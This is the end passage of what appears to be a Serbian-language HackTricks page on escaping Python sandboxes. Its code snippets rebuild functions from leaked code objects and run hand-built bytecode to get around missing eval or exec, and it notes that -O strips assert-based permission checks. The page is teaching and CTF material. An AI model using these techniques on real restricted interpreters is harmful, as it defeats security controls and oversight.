function_type(code_obj, mydict, None, None, None)("secretcode")
```

> [!TIP]
> U zavisnosti od verzije Pythona, **parametri** za `code_type` mogu biti drugačijeg redosleda. Najbolji način da saznate redosled parametara u verziji Pythona koju koristite jeste da pokrenete:
>
> ```
> import types
> types.CodeType.__doc__
> 'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
> ```

### Rekreiranje leaked funkcije

> [!WARNING]
> U sledećem primeru ćemo sve podatke potrebne za rekreiranje funkcije preuzeti direktno iz objekta koda funkcije. U **stvarnom primeru**, **vrednosti** potrebne za izvršavanje funkcije **`code_type`** su ono što ćete morati da leak-ujete.

```python
fc = get_flag.__code__
# In a real situation the values like fc.co_argcount are the ones you need to leak
code_obj = code_type(fc.co_argcount, fc.co_kwonlyargcount, fc.co_nlocals, fc.co_stacksize, fc.co_flags, fc.co_code, fc.co_consts, fc.co_names, fc.co_varnames, fc.co_filename, fc.co_name, fc.co_firstlineno, fc.co_lnotab, cellvars=fc.co_cellvars, freevars=fc.co_freevars)

mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
#ThisIsTheFlag
```

### Zaobilaženje odbrana

U prethodnim primerima na početku ove objave možete videti **kako da izvršite bilo koji Python kod koristeći funkciju `compile`**. Ovo je zanimljivo zato što možete **izvršiti cele skripte** sa petljama i svim ostalim u **jednoj liniji** (a isto bismo mogli da uradimo koristeći **`exec`**).\
U svakom slučaju, ponekad može biti korisno da **napravite** **kompajlirani objekat** na lokalnoj mašini i izvršite ga na **CTF mašini** (na primer, zato što nemamo funkciju `compiled` u CTF-u).

Na primer, hajde da kompajliramo i ručno izvršimo funkciju koja čita _./poc.py_:

```python
#Locally
def read():
    return open("./poc.py",'r').read()

read.__code__.co_code
't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
```

```python
#On Remote
function_type = type(lambda: None)
code_type = type((lambda: None).__code__) #Get <type 'type'>
consts = (None, "./poc.py", 'r')
bytecode = 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
names = ('open','read')

# And execute it using eval/exec
eval(code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ()))

#You could also execute it directly
mydict = {}
mydict['__builtins__'] = __builtins__
codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
function_type(codeobj, mydict, None, None, None)()
```

Ako ne možete da pristupite funkcijama `eval` ili `exec`, možete da napravite **pravu funkciju**, ali će njen direktan poziv obično neuspešno proći uz poruku: _constructor not accessible in restricted mode_. Zato vam je potrebna **funkcija koja nije u ograničenom okruženju da bi pozvala ovu funkciju.**

```python
#Compile a regular print
ftype = type(lambda: None)
ctype = type((lambda: None).func_code)
f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
f(42)
```

## Dekompajliranje kompajliranog Python koda

Pomoću alata kao što je [**https://www.decompiler.com/**](https://www.decompiler.com) može se **dekompajlirati** zadati kompajlirani Python kod.

**Pogledajte ovaj tutorijal**:


{{#ref}}
../../basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md
{{#endref}}

## Razno o Pythonu

### Assert

Python pokrenut uz optimizacije pomoću parametra `-O` ukloniće assert iskaze i sav kod uslovljen vrednošću promenljive **debug**.\
Zato se provere poput sledeće:<sup>[[6]](#references)</sup>

```python
def check_permission(super_user):
    try:
        assert(super_user)
        print("\nYou are a super user\n")
    except AssertionError:
        print(f"\nNot a Super User!!!\n")
```

biće zaobiđeno

## References

- [1] [Pyjail](https://lbarman.ch/blog/pyjail/)
- [2] [Izlazak iz Python sandboxa - CTF Wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
- [3] [Izlazak iz Python sandboxa (write-up za kvalifikacije NdH 2013)](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
- [4] [Izlazak iz Python 'sandboxa'](https://gynvael.coldwind.pl/n/python_sandbox_escape)
- [5] [Eval je zaista opasan](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)
- [6] [Kako assertions mogu dovesti do hakovanja](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
- [7] [CVE-2023-33733 (RCE pri evaluaciji izraza u ReportLab rl_safe_eval) – NVD](https://nvd.nist.gov/vuln/detail/cve-2023-33733)
- [8] [c53elyas/CVE-2023-33733 PoC i write-up](https://github.com/c53elyas/CVE-2023-33733)
- [9] [0xdf: University (HTB) – Exploiting xhtml2pdf/ReportLab CVE-2023-33733 radi dobijanja RCE](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
- [10] [0xdf: HTB Interpreter – Mirth Connect XStream RCE, probijanje Mirth hash-a i eskalacija privilegija putem Flask f-string eval](https://0xdf.gitlab.io/2026/05/30/htb-interpreter.html)
- [11] [SECCON CTF 2022 Quals: Autorski write-upovi (na engleskom)](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy)
- [12] [Anatomija LLM RCE-a - CyberArk Threat Research Blog](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce)
- [13] [Autorski write-upovi za BuckeyeCTF 2024](https://corgi.rip/posts/buckeye-writeups/)
- [14] [GeeksforGeeks – Ranljivost u str.format() u Pythonu](https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/)
- [15] [ur4ndom – GCTF 2022 Treebox](https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/)
- [16] [checkoway.net - Razmišljanja - Pickle](https://checkoway.net/musings/pickle)
- [17] [Probijanje AWS MCP Python sandboxa](https://xplo1t-sec.github.io/posts/breaking-the-aws-mcp-python-sandbox/)
- [18] [PEP 634 - Uparivanje strukturnih obrazaca: Specifikacija](https://peps.python.org/pep-0634/#class-patterns)
- [19] [Python dokumentacija - Ugrađene funkcije: `eval()` i `str()`](https://docs.python.org/3/library/functions.html)
{{#include ../../../banners/hacktricks-training.md}}
